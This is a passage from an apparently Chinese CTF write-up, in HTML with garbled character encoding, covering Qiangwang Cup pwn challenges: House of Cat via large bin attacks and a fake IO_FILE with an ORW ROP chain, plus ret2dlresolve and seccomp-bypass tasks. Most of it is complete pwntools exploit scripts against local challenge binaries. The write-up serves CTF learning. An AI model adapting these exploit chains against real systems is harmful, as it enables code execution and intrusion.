class="number">0x1960</span>))&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((gadget^(heap_base+<span class="number">0x1960</span>))&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">fake_file += p64(enc_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">Read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">Write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close = libc_base + libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">syscall = Read + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) + p64(heap_base+<span class="number">0x10d0</span>+<span class="number">0x460</span>)</span><br><span class="line">orw += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">orw += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">orw += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">orw += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x460</span>+<span class="number">0xa0</span>) + p64(ret)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(close)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_path)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(flag_path)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x41</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(Write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>, fake_file)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x438</span>, orw)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x438</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x458</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&#x27;pointer_guard-0x20 -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pointer_guard-<span class="number">0x20</span>)))</span><br><span class="line">edit(<span class="number">15</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x860</span>) + p64(pointer_guard-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x471</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x451</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x460</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>))</span><br><span class="line">success(<span class="string">&#x27;setcontext -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontext+<span class="number">61</span>)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0x177F)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ²™ç®±ç¦ç”¨äº† fd &gt; 2 çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤å…ˆ close(0) å† open ä¾¿å¯æ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦ 0ï¼Œè¯»å‡º flagã€‚</p><h3 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h3><p>åŒæ ·ä¹Ÿæ˜¯æ‰“ stderr+__malloc_assertï¼Œä½†è¯¥æ–¹æ³•ä¸ç”¨åŠ«æŒ pointer_guardã€‚ä¸€æ¬¡ large_bin_attack æ‰“ stderrï¼Œä¸€æ¬¡ large_bin_attack æ‰“ topchunk çš„ sizeã€‚</p><p>ä¸»è¦çš„ stderr æ„é€ å¦‚ä¸‹å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0xb0</span>)<span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x30</span>) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(orw_addr+<span class="number">0x10</span>)<span class="comment">#orw_addrå­˜æ”¾&quot;flag&quot;</span></span><br><span class="line">fake_IO_FILE +=p64(ret)<span class="comment">#setcontextçš„rcx</span></span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261131110.png" alt="image-20230926113141807" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261133816.png" alt="image-20230926113328714" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261135507.png" alt="image-20230926113525326" style="zoom:50%;" /><p>EXP å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./houseofcat&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;~\n&quot;</span>, <span class="string">b&quot;LOGIN | r00t QWBQWXF admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x448</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x448</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Context:\n&quot;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - (<span class="number">0x00007ff1860320d0</span>-<span class="number">0x7ff185e18000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.sym[<span class="string">&quot;stderr&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">ret = libc_base+<span class="number">0x0000000000029cd6</span></span><br><span class="line">orw_addr = heap_base+<span class="number">0x28e0</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">pop_rdx_r12_ret = libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">syscall_ret = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">orw = <span class="string">b&quot;./flag&quot;</span></span><br><span class="line">orw = orw.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(libc_base+libc.sym[<span class="string">&quot;close&quot;</span>])</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(orw_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall_ret)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(heap_base) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(libc_base+libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(heap_base) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(libc_base+libc.sym[<span class="string">&quot;write&quot;</span>])</span><br><span class="line"></span><br><span class="line">io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0xb0</span>)<span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x30</span>) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(orw_addr+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(ret)<span class="comment">#setcontext rcx</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x418</span>, fake_IO_FILE)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x428</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x448</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x448</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x1350</span>)+p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x448</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x438</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x458</span>, orw)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0xad0</span>)+p64(heap_base+<span class="number">0x2d30</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#add(11, 0x458, b&#x27;anza&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x0177F)&quot;)</span></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x458</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2021å¼ºç½‘æ¯"><a href="#2021å¼ºç½‘æ¯" class="headerlink" title="2021å¼ºç½‘æ¯"></a>2021å¼ºç½‘æ¯</h1><h2 id="1-no-output"><a href="#1-no-output" class="headerlink" title="1. no_output"></a>1. no_output</h2><p>32 ä½ç¨‹åºã€‚é€šè¿‡ strcpy ä¼šå‘æœ«å°¾æ·»åŠ  \x00 çš„ç‰¹æ€§è¦†ç›– fd ä¸º 0ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261517699.png" alt="image-20230926151746580" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261518318.png" alt="image-20230926151806275" style="zoom:50%;" /><p>ä¸ºäº†è§¦å‘æ ˆæº¢å‡º vuln å‡½æ•°ï¼Œç»™ v1 èµ‹å€¼ -1ï¼Œv2[0] èµ‹å€¼ -2147483648ï¼Œä½¿å…¶æ­£å‘æº¢å‡ºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261519706.png" alt="image-20230926151933649" style="zoom:50%;" /><p>ç”±äºæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œéœ€è¦æ‰“ ret2dlresolve æ¿å­ï¼Œå¯ä»¥ç›´æ¥ç”¨ pwntools è‡ªå¸¦çš„å·¥å…·ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261527552.png" alt="image-20230926152748522" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;hello_boy\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x080492CC&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-2147483648&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">io.send(fit(&#123;<span class="number">0x4C</span>: rop.chain(), <span class="number">0x100</span>: dlresolve.payload&#125;))</span><br><span class="line"><span class="comment">#0x4cæ˜¯paddingè·ç¦»ï¼Œ0x100æ˜¯è¯»å…¥æ•°æ®å¤šå°‘</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-orw"><a href="#2-orw" class="headerlink" title="2. orw"></a>2. orw</h2><p>é™„ä»¶ä¸­æœ‰ libseccomp.so.0ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æš‚æ—¶åŠ è½½ç¯å¢ƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=./libseccomp.so.0</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ²™ç®±è§„åˆ™ï¼Œæœç„¶åªå…è®¸ orwï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span 